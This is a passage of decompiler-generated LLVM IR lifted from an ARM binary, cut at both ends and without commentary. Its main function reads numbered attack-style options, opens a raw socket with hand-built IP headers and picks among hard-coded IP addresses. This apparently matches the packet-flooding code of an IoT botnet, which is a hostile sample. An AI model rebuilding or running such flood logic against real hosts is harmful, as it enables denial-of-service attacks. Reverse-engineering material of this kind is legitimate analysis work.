  %v5_a9f0 = inttoptr i32 %v4_a9f0 to i16*
  store i16 %v3_a9ec, i16* %v5_a9f0, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a9f8 = load i32, i32* @r6, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 6
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 0, i16* %v4_a9f8, align 2
  %v0_a9fc = load i32, i32* @r6, align 4
  store i32 %v0_a9fc, i32* @r1, align 4
  %v1_aa00 = add i32 %v0_a9fc, 4
  %v2_aa00 = inttoptr i32 %v1_aa00 to i16*
  %v3_aa00 = load i16, i16* %v2_aa00, align 2
  %v4_aa00 = zext i16 %v3_aa00 to i32
  store i32 %v4_aa00, i32* %r2.global-to-local, align 4
  %v0_aa04 = load i32, i32* @sb, align 4
  store i32 %v0_aa04, i32* %r3.global-to-local, align 4
  %v0_aa08 = load i32, i32* @r4, align 4
  store i32 %v0_aa08, i32* %r0.global-to-local, align 4
  %v4_aa0c = call i32 @function_c898(i32 %v0_aa08, i32 %v0_a9fc, i32 %v4_aa00, i32 %v0_aa04)
  %v5_aa0c = trunc i32 %v4_aa0c to i16
  store i32 %v4_aa0c, i32* %r0.global-to-local, align 4
  %v3_aa10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa10, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa18 = mul i32 %v3_aa10, 32
  store i32 %v3_aa18, i32* %ip.global-to-local, align 4
  %v3_aa1c = load i32, i32* @r6, align 4
  %v4_aa1c = add i32 %v3_aa1c, 6
  %v5_aa1c = inttoptr i32 %v4_aa1c to i16*
  store i16 %v5_aa0c, i16* %v5_aa1c, align 2
  %v0_aa20 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa20 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa20, -8
  %v5_aa20 = add i32 %v0_aa20, %tmp128
  store i32 %v5_aa20, i32* %ip.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r6, align 4
  %v1_aa24 = add i32 %v0_aa24, 2
  %v2_aa24 = inttoptr i32 %v1_aa24 to i16*
  %v3_aa24 = load i16, i16* %v2_aa24, align 2
  %v1_aa28 = load i32, i32* @lr, align 4
  %v2_aa28 = add i32 %v1_aa28, %v5_aa20
  store i32 %v2_aa28, i32* %ip.global-to-local, align 4
  %v3_aa2c = add i32 %v2_aa28, 2
  %v4_aa2c = inttoptr i32 %v3_aa2c to i16*
  store i16 %v3_aa24, i16* %v4_aa2c, align 2
  %v0_aa30 = load i32, i32* @fp, align 4
  %v1_aa30 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa30 = add i32 %v1_aa30, 4
  %v3_aa30 = inttoptr i32 %v2_aa30 to i32*
  store i32 %v0_aa30, i32* %v3_aa30, align 4
  %v0_aa34 = load i32, i32* @r4, align 4
  store i32 %v0_aa34, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v0_aa40 = load i32, i32* @sl, align 4
  store i32 %v0_aa40, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa48 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa50 = call i32 @function_11338(i32 %v3_a6e8, i32 %v0_aa34, i32 %v0_aa40, i32 16384, i32 %v0_aa48, i32 16)
  %v3_aa54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa54, i32* %r3.global-to-local, align 4
  %v1_aa58 = add i32 %v3_aa54, 1
  store i32 %v1_aa58, i32* %r0.global-to-local, align 4
  %v0_aa5c = load i32, i32* @r8, align 4
  %v9_aa5c = icmp eq i32 %v0_aa5c, %v1_aa58
  store i1 %v9_aa5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa58, i32* %stack_var_-44, align 4
  %v8_aa64 = icmp sgt i32 %v0_aa5c, %v1_aa58
  br i1 %v8_aa64, label %dec_label_pc_a98c, label %dec_label_pc_aa68

dec_label_pc_aa68:                                ; preds = %dec_label_pc_a9d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa6c = icmp eq i32 %v0_aa5c, 0
  store i1 %v2_aa6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aa6c, label %dec_label_pc_a970, label %dec_label_pc_a980

dec_label_pc_aa7c:                                ; preds = %dec_label_pc_a98c
  %v0_aa7c = call i32 @function_e094()
  %v1_aa7c = trunc i32 %v0_aa7c to i16
  store i32 %v0_aa7c, i32* %r0.global-to-local, align 4
  store i32 %v3_a74c, i32* @lr, align 4
  %v1_aa84 = load i32, i32* @r5, align 4
  %v9_aa84 = icmp eq i32 %v3_a74c, %v1_aa84
  store i1 %v9_aa84, i1* %cpsr_z.global-to-local, align 1
  %v3_aa88 = load i32, i32* @r4, align 4
  %v4_aa88 = add i32 %v3_aa88, 4
  %v5_aa88 = inttoptr i32 %v4_aa88 to i16*
  store i16 %v1_aa7c, i16* %v5_aa88, align 2
  br i1 %v9_aa84, label %dec_label_pc_aa90, label %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge

dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge:    ; preds = %dec_label_pc_aa7c
  %v1_a9bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9b8

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa7c, %dec_label_pc_a9ac
  %v0_aa90 = call i32 @function_e094()
  %v1_aa90 = trunc i32 %v0_aa90 to i16
  %v3_aa94 = load i32, i32* @r4, align 4
  %v4_aa94 = add i32 %v3_aa94, 20
  %v5_aa94 = inttoptr i32 %v4_aa94 to i16*
  store i16 %v1_aa90, i16* %v5_aa94, align 2
  store i32 %v3_a768, i32* %r0.global-to-local, align 4
  %v1_aa9c = load i32, i32* @r5, align 4
  %v9_aa9c = icmp eq i32 %v3_a768, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aaa4, label %dec_label_pc_a9c4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_a9b8
  %v0_aaa4 = call i32 @function_e094()
  %v1_aaa4 = trunc i32 %v0_aaa4 to i16
  store i32 %v0_aaa4, i32* %r0.global-to-local, align 4
  store i32 %v3_a770, i32* %r2.global-to-local, align 4
  %v1_aaac = load i32, i32* @r5, align 4
  %v9_aaac = icmp eq i32 %v3_a770, %v1_aaac
  store i1 %v9_aaac, i1* %cpsr_z.global-to-local, align 1
  %v3_aab0 = load i32, i32* @r6, align 4
  %v4_aab0 = add i32 %v3_aab0, 2
  %v5_aab0 = inttoptr i32 %v4_aab0 to i16*
  store i16 %v1_aaa4, i16* %v5_aab0, align 2
  br i1 %v9_aaac, label %dec_label_pc_aab8, label %dec_label_pc_a9d0

dec_label_pc_aab8:                                ; preds = %dec_label_pc_aaa4, %dec_label_pc_a9c4
  %v0_aab8 = call i32 @function_e094()
  %v1_aab8 = trunc i32 %v0_aab8 to i16
  store i32 %v0_aab8, i32* %r0.global-to-local, align 4
  %v3_aabc = load i32, i32* @r4, align 4
  %v4_aabc = add i32 %v3_aabc, 28
  %v5_aabc = inttoptr i32 %v4_aabc to i16*
  store i16 %v1_aab8, i16* %v5_aabc, align 2
  br label %dec_label_pc_a9d0

dec_label_pc_aac4:                                ; preds = %dec_label_pc_a650, %dec_label_pc_a630, %dec_label_pc_a5d4, %dec_label_pc_a480
  %v0_aac4 = call i32 @function_e094()
  %v1_aac8 = urem i32 %v0_aac4, 4
  store i32 %v1_aac8, i32* %r0.global-to-local, align 4
  %v2_aacc = icmp eq i32 %v1_aac8, 3
  store i1 %v2_aacc, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_aac4 to i2
  switch i2 %trunc, label %dec_label_pc_a6c811 [
    i2 0, label %dec_label_pc_ab00
    i2 1, label %dec_label_pc_ab2c
    i2 -2, label %dec_label_pc_ab20
    i2 -1, label %dec_label_pc_ab10
  ]

dec_label_pc_aae8:                                ; preds = %dec_label_pc_a6f8
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v1_aaec = call i32 @function_10be0(i32 %v3_a6e8)
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aaf0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_a6d0, %dec_label_pc_a6c8, %dec_label_pc_aae8
  %v1_aafc = phi i32 [ %v3_a6e8, %dec_label_pc_a6d0 ], [ %v1_aafc49, %dec_label_pc_a6c8 ], [ %v1_aaec, %dec_label_pc_aae8 ]
  store i32 %v18_a480, i32* %sb.global-to-local, align 4
  store i32 %v27_a480, i32* %lr.global-to-local, align 4
  ret i32 %v1_aafc

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aac4
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab10:                                ; preds = %dec_label_pc_aac4
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab20:                                ; preds = %dec_label_pc_aac4
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aac4
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a6c8

; uselistorder directives
  uselistorder i32 %v1_aac8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_aac4, { 1, 0 }
  uselistorder i32 %v0_aab8, { 1, 0 }
  uselistorder i32 %v0_aaa4, { 1, 0 }
  uselistorder i32 %v1_aa9c, { 1, 0 }
  uselistorder i32 %v0_aa7c, { 1, 0 }
  uselistorder i32 %v1_aa58, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa20, { 1, 0 }
  uselistorder i32 %v4_aa0c, { 1, 0 }
  uselistorder i32 %v2_a9ec, { 1, 0 }
  uselistorder i1 %v3_a9b0, { 1, 0 }
  uselistorder i1 %v3_a9a0, { 1, 0 }
  uselistorder i32 %v4_a9d4.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a948, { 1, 0, 2 }
  uselistorder i32 %v0_a938, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a924, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a920, { 1, 0, 2 }
  uselistorder i32 %v0_a890, { 1, 0 }
  uselistorder i32 %v4_a88c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a7d8, { 1, 0 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v1_a788, { 2, 0, 1 }
  uselistorder i32 %v3_a754, { 1, 0 }
  uselistorder i32 %v3_a74c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a744, { 0, 2, 1 }
  uselistorder i8 %v5_a73c, { 1, 0, 2 }
  uselistorder i32 %v1_a728, { 1, 0 }
  uselistorder i32 %v0_a728, { 1, 0 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i1 %v7_a6ec, { 1, 0 }
  uselistorder i32 %v3_a6e8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a6c8, { 1, 0, 2 }
  uselistorder i32 %v2_a698, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a694, { 1, 0, 2 }
  uselistorder i1 %v7_a684, { 1, 0 }
  uselistorder i32 %v1_a680, { 1, 0, 2 }
  uselistorder i1 %v8_a678, { 1, 0 }
  uselistorder i1 %v7_a674, { 1, 0 }
  uselistorder i32 %v1_a668, { 1, 0 }
  uselistorder i8 %v2_a65c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a660, { 1, 0 }
  uselistorder i32 %v0_a680, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a650, { 0, 2, 1 }
  uselistorder i32 %v1_a664, { 0, 2, 1 }
  uselistorder i32 %v2_a638, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a630, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a628, { 1, 0 }
  uselistorder i32 %v0_a628, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a5cc, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a56c, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a550, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a538, { 2, 1, 0 }
  uselistorder i32 %v1_a520, { 1, 0 }
  uselistorder i32 %v7_a4dc, { 1, 0, 2 }
  uselistorder i32 %v2_a4a0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 6, 8, 7, 10, 9, 11, 13, 12, 14, 15, 16, 18, 17, 20, 19, 21, 22, 23, 28, 24, 25, 26, 27, 32, 29, 30, 31, 33, 35, 34, 36, 2, 37, 38, 40, 39, 41, 42, 44, 43, 45, 1, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aaf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %dec_label_pc_a970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a970.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a940, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 1, 0 }
  uselistorder label %dec_label_pc_a684, { 1, 0 }
  uselistorder label %dec_label_pc_a650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a648, { 1, 0 }
}

define i32 @function_ab3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ab3c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab3c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab58 = call i32 @function_11f24(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_ab64 = load i32, i32* @r6, align 4
  store i32 %v0_ab64, i32* %r0.global-to-local, align 4
  %v2_ab68 = call i32 @function_11f24(i32 %v0_ab64, i32 4)
  %v0_ab6c = load i32, i32* @r5, align 4
  store i32 %v0_ab6c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r4, align 4
  store i32 %v0_ab7c, i32* %r0.global-to-local, align 4
  %v5_ab80 = inttoptr i32 %v0_ab6c to i32*
  %v6_ab80 = call i32 @function_8570(i32 %v0_ab7c, i32* %v5_ab80, i32 2, i32 0)
  %v1_ab8c = urem i32 %v6_ab80, 256
  store i32 %v1_ab8c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ab98 = load i32, i32* @r5, align 4
  store i32 %v0_ab98, i32* %r1.global-to-local, align 4
  %v0_ab9c = load i32, i32* @r4, align 4
  store i32 %v0_ab9c, i32* %r0.global-to-local, align 4
  %v5_aba0 = trunc i32 %v6_ab80 to i8
  %v6_aba4 = inttoptr i32 %v0_ab98 to i32*
  %v7_aba4 = call i32 @function_8570(i32 %v0_ab9c, i32* %v6_aba4, i32 3, i32 65535)
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_aba4, i32* @r7, align 4
  %v0_abb8 = load i32, i32* @r4, align 4
  store i32 %v0_abb8, i32* %r0.global-to-local, align 4
  %v4_abbc = inttoptr i32 %v0_aba8 to i32*
  %v5_abbc = call i32 @function_8570(i32 %v0_abb8, i32* %v4_abbc, i32 4, i32 64)
  %v1_abc4 = urem i32 %v5_abbc, 256
  store i32 %v1_abc4, i32* %ip.global-to-local, align 4
  %v0_abc8 = load i32, i32* @r5, align 4
  store i32 %v0_abc8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_abd4 = load i32, i32* @r4, align 4
  store i32 %v0_abd4, i32* %r0.global-to-local, align 4
  %v6_abdc = inttoptr i32 %v0_abc8 to i32*
  %v7_abdc = call i32 @function_8570(i32 %v0_abd4, i32* %v6_abdc, i32 5, i32 1)
  %v1_abe8 = urem i32 %v7_abdc, 256
  store i32 %v1_abe8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_abf0 = load i32, i32* @r5, align 4
  store i32 %v0_abf0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v5_ac00 = inttoptr i32 %v0_abf0 to i32*
  %v6_ac00 = call i32 @function_8570(i32 %v0_abf8, i32* %v5_ac00, i32 7, i32 65535)
  %v0_ac04 = load i32, i32* @r5, align 4
  store i32 %v0_ac04, i32* %r1.global-to-local, align 4
  %v3_ac08 = mul i32 %v6_ac00, 65536
  store i32 %v3_ac08, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v3_ac18 = urem i32 %v6_ac00, 65536
  store i32 %v3_ac18, i32* @sl, align 4
  %v4_ac1c = inttoptr i32 %v0_ac04 to i32*
  %v5_ac1c = call i32 @function_8570(i32 %v0_ac14, i32* %v4_ac1c, i32 11, i32 1)
  %v1_ac24 = urem i32 %v5_ac1c, 256
  store i32 %v1_ac24, i32* %ip.global-to-local, align 4
  %v0_ac28 = load i32, i32* @r5, align 4
  store i32 %v0_ac28, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac34 = load i32, i32* @r4, align 4
  store i32 %v0_ac34, i32* %r0.global-to-local, align 4
  %v5_ac3c = inttoptr i32 %v0_ac28 to i32*
  %v6_ac3c = call i32 @function_8570(i32 %v0_ac34, i32* %v5_ac3c, i32 12, i32 1)
  %v1_ac44 = urem i32 %v6_ac3c, 256
  store i32 %v1_ac44, i32* %ip.global-to-local, align 4
  %v0_ac48 = load i32, i32* @r5, align 4
  store i32 %v0_ac48, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v5_ac5c = inttoptr i32 %v0_ac48 to i32*
  %v6_ac5c = call i32 @function_8570(i32 %v0_ac54, i32* %v5_ac5c, i32 13, i32 1)
  %v1_ac64 = urem i32 %v6_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @function_8570(i32 %v0_ac74, i32* %v5_ac7c, i32 14, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @function_8570(i32 %v0_ac94, i32* %v5_ac9c, i32 15, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @function_8570(i32 %v0_acb4, i32* %v5_acbc, i32 16, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_acd0 = load i32, i32* @r5, align 4
  store i32 %v0_acd0, i32* %r1.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acd0 to i32*
  %v6_acdc = call i32 @function_8570(i32 %v0_acd4, i32* %v5_acdc, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acec = load i32, i32* @r5, align 4
  store i32 %v0_acec, i32* %r1.global-to-local, align 4
  %v0_acf0 = load i32, i32* @r4, align 4
  store i32 %v0_acf0, i32* %r0.global-to-local, align 4
  %v4_acf4 = inttoptr i32 %v0_acec to i32*
  %v5_acf4 = call i32 @function_8570(i32 %v0_acf0, i32* %v4_acf4, i32 1, i32 1)
  %v1_acfc = urem i32 %v5_acf4, 256
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad10 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_ad10, i32* %r0.global-to-local, align 4
  %v7_ad14 = icmp eq i32 %v3_ad10, -1
  store i1 %v7_ad14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad10, i32* @sb, align 4
  br i1 %v7_ad14, label %dec_label_pc_af04, label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ab3c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad28 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad28, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad3c = call i32 @function_11378(i32 %v3_ad10, i32 0, i32 3, i32 %v6_ad28, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad3c, i32* %r0.global-to-local, align 4
  %v7_ad40 = icmp eq i32 %v5_ad3c, -1
  store i1 %v7_ad40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad40, label %dec_label_pc_aefc, label %dec_label_pc_ad48

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ad20
  %v0_ad48 = load i32, i32* @r7, align 4
  %v3_ad48 = mul i32 %v0_ad48, 65536
  store i32 %v3_ad48, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad50 = load i32, i32* @r6, align 4
  %v2_ad50 = icmp eq i32 %v0_ad50, 0
  store i1 %v2_ad50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad58 = urem i32 %v0_ad48, 65536
  store i32 %v3_ad58, i32* @fp, align 4
  br i1 %v2_ad50, label %dec_label_pc_b188, label %dec_label_pc_ad60.preheader

dec_label_pc_ad60.preheader:                      ; preds = %dec_label_pc_ad48
  %v2_adac = ptrtoint i32* %stack_var_-144 to i32
  %v2_adf0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae28 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae34 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae38 = ptrtoint i32* %stack_var_-48 to i32
  %v4_ae98 = zext i8 %tmp to i32
  %v1_ae9c = and i32 %v4_ae98, 18
  %v2_aea0 = icmp eq i32 %v1_ae9c, 18
  %v4_b044 = sext i8 %v5_aba0 to i32
  %sext = mul i32 %v5_abbc, 16777216
  %v4_b054 = sdiv i32 %sext, 16777216
  %v3_ae84 = sext i16 %tmp61 to i32
  %v1_aea8 = and i32 %v4_ae98, 5
  %v2_aea8 = icmp eq i32 %v1_aea8, 0
  %v4_ade8 = add i32 %v2_adac, 82
  %v5_ade8 = inttoptr i32 %v4_ade8 to i16*
  %v1_afd8 = add i32 %v6_acdc, 40
  %v1_b0ec = urem i32 %v5_ac1c, 2
  %tmp97 = sub nsw i32 0, %v1_b0ec
  %v4_b0f4 = and i32 %tmp97, 32
  %v1_b104 = urem i32 %v6_ac3c, 2
  %tmp98 = sub nsw i32 0, %v1_b104
  %v4_b10c = and i32 %tmp98, 16
  %v1_b11c = urem i32 %v6_ac5c, 2
  %tmp99 = sub nsw i32 0, %v1_b11c
  %v4_b124 = and i32 %tmp99, 8
  %v1_b134 = urem i32 %v6_ac7c, 2
  %tmp100 = sub nsw i32 0, %v1_b134
  %v4_b13c = and i32 %tmp100, 4
  %v1_b14c = urem i32 %v6_ac9c, 2
  %tmp101 = sub nsw i32 0, %v1_b14c
  %v3_b154 = and i32 %tmp101, 2
  %v1_b164 = urem i32 %v6_acbc, 2
  br label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad60.preheader, %dec_label_pc_aed4
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_aed4 ], [ %tmp34, %dec_label_pc_ad60.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_aed4 ], [ %tmp37, %dec_label_pc_ad60.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ad6c = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_ad6c, i32* %r0.global-to-local, align 4
  %v7_ad70 = icmp eq i32 %v3_ad6c, -1
  store i1 %v7_ad70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad6c, i32* @r5, align 4
  br i1 %v7_ad70, label %dec_label_pc_aed4, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad60, %dec_label_pc_aeb0
  %v0_ad84 = phi i32 [ %v3_aec4, %dec_label_pc_aeb0 ], [ %v3_ad6c, %dec_label_pc_ad60 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aeb0 ], [ %stack_var_-62.0, %dec_label_pc_ad60 ]
